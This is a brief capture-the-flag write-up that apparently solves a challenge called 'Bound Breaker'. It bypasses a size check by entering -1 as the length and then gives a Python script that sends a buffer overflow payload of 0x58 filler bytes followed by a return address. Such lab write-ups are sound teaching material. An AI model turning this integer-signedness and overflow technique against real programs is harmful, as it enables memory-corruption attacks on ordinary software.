![](img/Bound%20Breaker-1778742247503.webp)

the program gave us all the address we need, the only problem is that we cant really reach >55 bytes without some tricks

try entering "-1" bytes to see if we can overflow the number (for example, a -1 in dword can be displayed 0xffffffff (this only happen with signed variables (even doe most recent program use signed variables)))

it work, flawlessly

```
Send your payload (up to -1 bytes)!
aaaa
You sent 5 bytes!
```

now, some python code is sufficent to finish off the challenge

```
#!/usr/bin/python3
import sys
sz=-1
payload=b"A"*0x58 
payload+=b"\xd1\x1b\x40"
sys.stdout.buffer.write(str(sz).encode() + b"\n" + payload)
```
